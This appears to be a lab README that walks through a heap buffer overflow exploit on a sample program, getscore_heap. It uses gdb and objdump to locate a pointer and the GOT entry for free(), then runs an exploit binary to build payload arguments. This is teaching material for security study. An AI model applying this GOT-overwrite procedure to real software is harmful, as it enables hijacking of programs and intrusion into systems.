PURPOSE:  To exploit heap memory vulnerability using heap buffer overflow.


Files needed------

getscore_heap.c
score.txt
exploit.c





Procedure to run exploit program------

Step 1:  Compile getscore_heap.c and exploit.c
$ gcc -g -o getscore_heap  getscore_heap.c
$ gcc -g -o exploit  exploit.c

Step 2:  Use gdb to find value for “what”, that is, the matching_pattern pointer
$ gdb ./getscore_heap
(gdb) l 44
(gdb) b 44
(gdb) r “any_text_will_do” “whatever_text”
(gdb) p matching_pattern
(gdb) quit

Step 3:  Use objdump to find value for “where”, that is, the address for free() function in GOT
$ objdump -R ./getscore_heap

Step 4:  Run exploit to generate arg1 and arg2 environment variables, ie exploit <where> <what>
$ ./exploit  0x08049c90  0x08049e28

Step 5:  Exploit the getscore_heap program
$ ./getscore_heap  $arg1  $arg2

